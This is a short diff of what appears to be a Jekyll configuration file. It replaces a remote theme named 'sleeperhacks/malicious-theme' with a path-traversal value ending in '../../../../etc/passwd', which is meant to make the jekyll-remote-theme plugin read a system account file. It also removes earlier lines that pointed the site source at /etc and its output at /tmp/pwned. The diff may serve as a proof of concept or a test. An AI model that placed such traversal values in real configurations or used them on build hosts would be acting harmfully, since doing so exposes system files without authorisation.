@@ -1,5 +1,3 @@
-remote_theme: sleeperhacks/malicious-theme
+remote_theme: sleeperhacks/malicious-theme@main/../../../../etc/passwd
 plugins:
   - jekyll-remote-theme
-source: /etc
-destination: /tmp/pwned
